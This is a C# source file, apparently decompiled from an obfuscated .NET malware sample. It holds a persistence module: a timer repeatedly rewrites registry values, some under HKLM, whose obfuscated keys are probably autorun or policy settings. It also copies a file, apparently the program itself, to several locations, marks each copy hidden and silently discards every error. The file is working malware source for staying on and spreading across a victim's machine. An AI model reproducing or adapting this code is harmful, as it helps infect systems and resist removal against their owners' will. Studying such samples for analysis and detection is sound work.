using System.IO;
using System.Timers;
using Microsoft.Win32;

namespace ns0;

internal class Class0
{
	private static Timer timer_0 = new Timer();

	public static void smethod_0()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		timer_0.set_Interval((double)(Class2.int_1 * 1000));
		timer_0.add_Elapsed(new ElapsedEventHandler(smethod_2));
		timer_0.Start();
	}

	public static void smethod_1()
	{
		timer_0.Stop();
	}

	private static void smethod_2(object sender, ElapsedEventArgs e)
	{
		smethod_3(Class1.registryKey_0, _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_8(), Class2.string_3[0], Class2.string_2[0], RegistryValueKind.String);
		smethod_3(Class1.registryKey_0, _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_9(), Class2.string_3[1], Class2.string_2[1], RegistryValueKind.String);
		smethod_3(Registry.LocalMachine, _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_10() + Class2.string_3[2], _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_11(), Class2.string_2[0] + _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_12(), RegistryValueKind.String);
		smethod_3(Registry.LocalMachine, _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_10() + Class2.string_3[2], _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_13(), 1, RegistryValueKind.DWord);
		try
		{
			string[] string_ = Class2.string_2;
			foreach (string text in string_)
			{
				if (!Class12.smethod_2(text))
				{
					File.Copy(Class2.string_4, text);
					File.SetAttributes(text, FileAttributes.Hidden);
				}
			}
		}
		catch
		{
		}
	}

	private static void smethod_3(RegistryKey registryKey_0, string string_0, string string_1, object object_0, RegistryValueKind registryValueKind_0)
	{
		try
		{
			if (registryKey_0.OpenSubKey(string_0) == null)
			{
				registryKey_0.CreateSubKey(string_0);
			}
			RegistryKey registryKey = registryKey_0.OpenSubKey(string_0, writable: true);
			if (registryKey.Equals(string_1))
			{
				if (registryKey.GetValue(string_1) != object_0)
				{
					registryKey.SetValue(string_1, object_0, registryValueKind_0);
				}
			}
			else
			{
				registryKey.SetValue(string_1, object_0, registryValueKind_0);
			}
		}
		catch
		{
		}
	}
}
